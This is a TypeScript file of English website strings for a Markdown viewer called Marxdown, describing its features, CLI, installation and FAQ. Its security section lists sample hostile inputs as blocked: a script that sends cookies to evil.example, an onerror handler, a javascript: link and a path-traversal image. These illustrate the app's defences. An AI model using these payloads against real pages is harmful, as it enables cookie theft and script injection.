import type { Messages } from './ja';

/** サイトの文言（英語）。語はアプリの英語 UI（`src/i18n/en/`）と README.en.md に合わせる。 */
export const en: Messages = {
  meta: {
    siteName: 'Marxdown',
    title: 'Marxdown — A Fast Markdown Viewer for Windows',
    description:
      'Marxdown is a fast, reading-first Markdown viewer and editor for Windows. Open Markdown files instantly, read comfortably, and edit when needed. Free and open source.',
    guideSuffix: 'Marxdown Guide',
    imageAlt:
      'The Marxdown logo and the words “Don’t open VS Code just to read a Markdown file.”, next to Marxdown showing a design document',
  },

  nav: {
    skip: 'Skip to content',
    features: 'Features',
    faq: 'FAQ',
    guide: 'Guide',
    download: 'Download',
    github: 'GitHub',
    menu: 'Menu',
    search: 'Search the guide',
    appearance: 'Appearance',
    appearanceOptions: { system: 'System', light: 'Light', dark: 'Dark' },
    language: 'Language',
  },

  hero: {
    badge: (version: string) => `v${version} is out`,
    badgeLink: 'Changelog',
    titleLines: ['Don’t open VS Code', '*just to read a Markdown file.*'],
    lead: 'A fast, reading-first Markdown viewer for Windows. Open it with {command}, read comfortably, and edit when you need to.',
    leadCommand: 'marxdown README.md',
    download: 'Download for Windows',
    downloadMeta: (version: string) => `v${version} · Windows 10 / 11 (x64) · Free and open source`,
    github: 'View on GitHub',
    replay: 'Replay',
    terminalTitle: 'Windows PowerShell',
    prompt: 'PS C:\\work\\sync\\docs>',
    commands: ['marxdown architecture.md', 'marxdown research.md'],
  },

  statement: {
    eyebrow: 'Sound familiar?',
    lines: [
      '*Design docs* written by an AI. A repository’s *README*. *Meeting notes*.',
      'You want to “just read” a Markdown file dozens of times a day.',
      'And every time, you wait for an IDE to start.',
    ],
    closing: 'Marxdown is an app for opening, reading, and making a small fix when you need to.',
  },

  different: {
    eyebrow: 'Marxdown and VS Code',
    title: 'VS Code is great. Marxdown is different.',
    body: 'VS Code is a powerful development environment. Marxdown is for the moments when you don’t need one. Many people use both: VS Code for writing code, Marxdown for reading what is written about it.',
    columns: [
      {
        name: 'VS Code',
        role: 'A development environment for code',
        points: [
          'Starts by loading a workspace and extensions',
          'Opens Markdown as source, with the preview opened separately',
          'Has every tool for writing, running, and fixing code',
        ],
      },
      {
        name: 'Marxdown',
        role: 'A place to read Markdown',
        points: [
          'Opens a single file as it is',
          'Opens in a view made for reading',
          'Switches to the same Monaco editor when you want to fix something',
        ],
      },
    ],
  },

  speed: {
    eyebrow: 'Opens quickly',
    title: 'No waiting, every time you open.',
    body: 'Open a Markdown file without waiting for a full IDE to initialize. After the first launch Marxdown waits in the system tray, and later marxdown calls open as tabs in the existing window. The prompt in your terminal comes back right away, too.',
    stats: [
      { value: '600', unit: 'ms', label: 'First launch (target)' },
      { value: '120', unit: 'ms', label: 'After that (target)' },
      { value: '≈0', unit: '%', label: 'CPU usage while waiting' },
    ],
    note: 'Startup times are design targets, checked as the median of each startup phase on a release build. Actual times depend on your PC.',
    tray: 'Waiting in the system tray',
    tabNote: 'Opens as a tab in the existing window',
  },

  tour: {
    eyebrow: 'How you’ll use it',
    title: 'Read it. Fix it if you need to.',
    steps: [
      {
        id: 'read',
        label: 'Read',
        title: 'An AI just sent you a long design doc',
        body: 'Open it in Marxdown and it is ready to read. Typography with balanced margins, line height, and text width keeps long documents easy on the eyes, and tables, code, math, and diagrams are shown as they are.',
        chips: [
          'Tables',
          'Syntax highlighting',
          'Math (KaTeX)',
          'Diagrams (Mermaid)',
          'GitHub alerts',
          'Task lists',
          'Footnotes',
        ],
      },
      {
        id: 'write',
        label: 'Write',
        title: 'You notice something that needs fixing',
        body: 'One key switches to Split, and you fix it right there. The editor is Monaco, the same editor as VS Code, and what you type shows up in the preview next to it.',
        chips: [],
      },
      {
        id: 'format',
        label: 'Format',
        title: 'A table’s columns don’t line up',
        body: 'Shift+Alt+F lines up a messy table. Bold, links, headings, and lists can be toggled with shortcuts, too.',
        chips: [],
      },
      {
        id: 'find',
        label: 'Find',
        title: 'You want to look through a whole folder',
        body: 'marxdown docs/ opens the folder with a file list. Find files by part of their name with Ctrl+P, and run every action from the Command Palette with Ctrl+Shift+P.',
        chips: [],
      },
    ],
    keys: {
      split: 'Split',
      bold: 'Bold',
      align: 'Align table columns',
      quickOpen: 'Go to File',
      commandPalette: 'Command Palette',
    },
    quickOpenPlaceholder: 'Type a file name',
    quickOpenQuery: 'cache',
  },

  ai: {
    eyebrow: 'Markdown in the age of AI',
    title: 'A place to read the Markdown AI writes for you.',
    body: 'Ask an AI for a design, research, meeting notes, or a review, and you increasingly get Markdown back. You spend more time reading Markdown than writing it. Marxdown gives those documents a dedicated place to be read.',
    kinds: [
      'Architecture documents',
      'Research notes',
      'Meeting summaries',
      'Implementation plans',
      'Code reviews',
      'Project documentation',
    ],
    points: [
      {
        title: 'Read the output as it is',
        body: 'Pipe a command’s output into Marxdown and read it as a document, with tables and code rendered.',
        command: 'llm "Draft a design" | marxdown -',
      },
      {
        title: 'Watch the folder your agent writes into',
        body: 'When an agent rewrites a file, the open document reloads automatically.',
        command: 'marxdown docs/',
      },
      {
        title: 'Safe for documents you didn’t write',
        body: 'Scripts in a document never run, and files outside the folder are not loaded unless you allow it.',
        command: '',
      },
    ],
  },

  themes: {
    eyebrow: 'Make it yours',
    title: 'Find the one among 50 color themes.',
    body: 'On top of light and dark, there are 50 built-in color themes, chosen separately for the preview and the editor. Add your own by just dropping in a CSS file.',
    scheme: 'Appearance',
    schemeLight: 'Light',
    schemeDark: 'Dark',
    current: 'Current color theme',
    custom: 'Just drop a CSS file into the themes folder',
    defaultName: 'Marxdown',
  },

  typography: {
    eyebrow: 'Readability',
    title: 'Typography matters when you read for an hour.',
    body: 'Markdown is often read for minutes or hours, not seconds. So you can adjust the text and code fonts, font size, line height, text width, and table borders. Changes show up in the preview right away.',
    fontSize: 'Font size',
    lineHeight: 'Line height',
    maxWidth: 'Text width',
    tableStyle: 'Table borders',
    tableStyles: { lines: 'Horizontal lines', grid: 'Grid', zebra: 'Stripes' },
    font: 'Font',
    fonts: { sans: 'Sans-serif', serif: 'Serif' },
    reset: 'Reset',
  },

  bytes: {
    eyebrow: 'Save with confidence',
    title: 'Not a single byte you didn’t edit will change.',
    body: 'Lines you didn’t touch stay exactly as they were. Line endings, the BOM, and the final newline are kept as they were when opened. When another app changes the file, it reloads automatically.',
    chips: ['Still UTF-8 with BOM', 'Still CRLF', 'Final newline kept'],
    changed: 'Bytes changed',
    total: 'Whole file',
    unit: 'bytes',
    before: 'Before saving',
    after: 'After saving',
    edit: { from: '5', to: '3' },
  },

  security: {
    eyebrow: 'Files you didn’t write',
    title: 'Open Markdown you didn’t write, without worry.',
    body: 'Marxdown is built on the assumption that you open Markdown you didn’t write, like files generated by an LLM. Several layers of defense keep a document from reaching into the app or your computer.',
    file: 'untrusted.md',
    threats: [
      {
        code: '<script>fetch("https://evil.example/?" + document.cookie)</script>',
        verdict: 'Embedded scripts never run',
      },
      { code: '<img src="x" onerror="alert(1)">', verdict: 'Event attributes like onerror are removed' },
      { code: '[Read more](javascript:alert(1))', verdict: 'Links of unknown kinds do nothing' },
      { code: '![](../../Pictures/private.png)', verdict: 'Nothing outside the folder is loaded unless you allow it' },
    ],
    layers: ['CSP', 'Sanitizer', 'Link allowlist', 'Read scope check'],
    blocked: 'Blocked',
    safe: 'Shown safely',
  },

  features: {
    eyebrow: 'And more',
    title: 'The small things that help, too.',
    items: [
      {
        icon: 'outline',
        title: 'Outline',
        body: 'Jump to the part you want from the list of headings.',
        keys: 'Ctrl+Shift+U',
      },
      { icon: 'search', title: 'Find in preview', body: 'Search the document you are viewing.', keys: 'Ctrl+F' },
      { icon: 'slides', title: 'Marp slides', body: 'Documents with marp: true are shown as slides.', keys: '' },
      {
        icon: 'export',
        title: 'Export to HTML / PDF',
        body: 'Turn the document you are viewing into HTML or PDF.',
        keys: '',
      },
      {
        icon: 'reload',
        title: 'Automatic reload',
        body: 'When another app changes the file, it reloads automatically.',
        keys: '',
      },
      {
        icon: 'files',
        title: 'File operations',
        body: 'Create, rename, copy, and move files to the Recycle Bin from the file list.',
        keys: '',
      },
      {
        icon: 'pipe',
        title: 'Open from stdin',
        body: 'Open the output of a command as an untitled document.',
        keys: '',
      },
      {
        icon: 'language',
        title: 'English and Japanese',
        body: 'The app is available in English and Japanese. By default it follows the display language of Windows.',
        keys: '',
      },
      {
        icon: 'update',
        title: 'Automatic updates',
        body: 'When a new version is out, the app lets you know and updates with a single button.',
        keys: '',
      },
      {
        icon: 'folder',
        title: 'From File Explorer',
        body: 'Double-click a .md file, or open a folder from its right-click menu.',
        keys: '',
      },
    ],
  },

  cli: {
    eyebrow: 'From the terminal',
    command: 'marxdown README.md',
    title: 'No workspace. No project setup. Just read.',
    body: 'Type it in the terminal you already have open and start reading. Whether you run it from cmd.exe, PowerShell, or Git Bash, the prompt comes back right away.',
    examples: [
      { command: 'marxdown README.md', description: 'Open a file' },
      { command: 'marxdown README.md CHANGELOG.md', description: 'Open several files at once' },
      { command: 'marxdown docs/', description: 'Open a folder' },
      { command: 'marxdown -m split notes.md', description: 'Open in a specific view mode' },
      { command: 'llm "Draft a design" | marxdown -', description: 'Open standard input as an untitled document' },
    ],
    copy: 'Copy',
    copied: 'Copied',
  },

  install: {
    eyebrow: 'Get started',
    title: 'Download. Install. Open a .md file.',
    steps: [
      { title: 'Download', body: 'Download Marxdown_<version>_x64-setup.exe from Releases.' },
      {
        title: 'Install',
        body: 'Just run it. No administrator rights needed. Choose “Yes” at the last prompt to enable the marxdown command.',
      },
      {
        title: 'Open a .md file',
        body: 'Double-click any .md file, or type marxdown README.md in your terminal.',
      },
    ],
    smartScreen:
      'Windows may show a SmartScreen warning because the installer is currently unsigned. Choose “More info” and then “Run anyway” to continue.',
    requirements: 'Requirements: Windows 10 / 11 (x64). The WebView2 Runtime is required (it comes with Windows 11).',
    more: 'Detailed installation steps',
  },

  faq: {
    eyebrow: 'FAQ',
    title: 'Questions you might have.',
    items: [
      {
        question: 'Is Marxdown an editor?',
        answer:
          'Yes, but it is designed around reading Markdown first. It opens in a reading view, and one key switches to Split or Edit, where you edit with Monaco, the same editor VS Code uses.',
      },
      {
        question: 'Why not just use VS Code?',
        answer:
          'VS Code is a great development environment, and it has a Markdown preview. Marxdown is for quickly opening and reading Markdown when you don’t need a workspace and extensions. Many people use both.',
      },
      {
        question: 'Does it work offline?',
        answer:
          'Yes. All rendering, including Mermaid diagrams and math, happens on your PC. Marxdown connects to the internet only to check for updates and to load https:// images that a document contains.',
      },
      {
        question: 'Is my Markdown uploaded anywhere?',
        answer:
          'No. There is no account and no telemetry. The update check asks GitHub Releases for the latest version and contains nothing about your files. You can turn it off in Settings.',
      },
      {
        question: 'Is Marxdown free?',
        answer: 'Yes. It is open source under the MIT license, and free for work, too.',
      },
      {
        question: 'What platforms are supported?',
        answer: 'Windows 10 and 11 (x64). There are no macOS or Linux versions at the moment.',
      },
      {
        question: 'Why does SmartScreen warn me when I install it?',
        answer:
          'Because the installer is currently not code-signed. Choose “More info” and then “Run anyway” to continue. The installer is built by GitHub Actions from the public source code.',
      },
    ],
  },

  cta: {
    title: 'Open one .md file and see.',
    body: 'Free and open source. Try it on Windows 10 / 11 right now.',
    download: 'Download for Windows',
    github: 'View on GitHub',
  },

  footer: {
    tagline: 'Don’t open VS Code just to read a Markdown file.',
    product: 'Product',
    guide: 'Guide',
    community: 'Community',
    features: 'Features',
    download: 'Download',
    changelog: 'Changelog',
    issues: 'Report a bug',
    ideas: 'Suggest a feature',
    security: 'Security',
    source: 'Source code',
    license: 'MIT License',
  },

  guide: {
    title: 'Guide',
    pages: {
      start: 'Getting started',
      shortcuts: 'Keyboard shortcuts',
      syntax: 'Syntax',
      settings: 'Settings',
    },
    descriptions: {
      start: 'Installation, using Marxdown from the command line, where files are kept, and more to get you started.',
      shortcuts: 'The list of Marxdown keyboard shortcuts.',
      syntax: 'The Markdown syntax Marxdown can show. The source is on the left and the result on the right.',
      settings: 'Every setting, in the same order as the Settings screen (Ctrl+,).',
    },
    onThisPage: 'On this page',
    edit: 'Source of this page',
    prev: 'Previous',
    next: 'Next',
    filter: 'Filter',
    shortcutFilterPlaceholder: 'Filter by action or key (e.g. Save, Ctrl+P)',
    settingFilterPlaceholder: 'Filter by name or key (e.g. line height, editor.fontSize)',
    noMatch: 'Nothing matches',
    source: 'Source',
    result: 'Result',
    settingKey: 'Key',
    settingDefault: 'Default',
    settingRange: 'Range',
    settingOptions: 'Options',
    settingEmpty: '(empty)',
    copyKey: 'Copy key',
    requiresSetting: 'Available after turning it on in Settings',
    settingsIntro:
      'Listed in the same order as the Settings screen (Ctrl+,). When editing settings.json directly, use the key of each setting (e.g. preview.fontSize). Open settings.json from “Open settings.json” in Settings.',
    customThemes: {
      title: 'Adding your own color theme',
      body: [
        'Each .css file in the themes folder becomes a color theme and appears in Color Theme in Settings. It can be selected for both the preview and the editor. The theme name is the file name without the extension (only letters, digits, - and _).',
        'Write only declarations in the file, without selectors. Use light-dark() for different colors in light and dark, and color-scheme for a theme that supports only one of them. A file with the same name as a built-in theme is used instead of it. Changes take effect as soon as you save the file.',
      ],
      location: 'Location',
      variables: 'Variables',
      groups: {
        surface: 'Background',
        text: 'Text',
        border: 'Borders',
        accent: 'Accent',
        code: 'Code',
      },
    },
    marpNote: 'Slide preview',
  },

  palette: {
    placeholder: 'Search the guide',
    empty: 'No results',
    hint: '↑↓ to select · Enter to go · Esc to close',
    kinds: { page: 'Page', shortcut: 'Shortcut', setting: 'Setting', syntax: 'Syntax', section: 'Section' },
    open: 'Search the guide',
  },

  window: {
    mode: { preview: 'Preview', edit: 'Edit', split: 'Split' },
    encoding: 'UTF-8',
    eol: 'LF',
    chars: (count: number) => `${count.toLocaleString('en-US')} chars`,
    minutes: (count: number) => `~${count} min`,
    sync: 'Scroll sync: On',
    untitled: 'Untitled',
    explorer: 'Explorer',
    outline: 'Outline',
  },
};
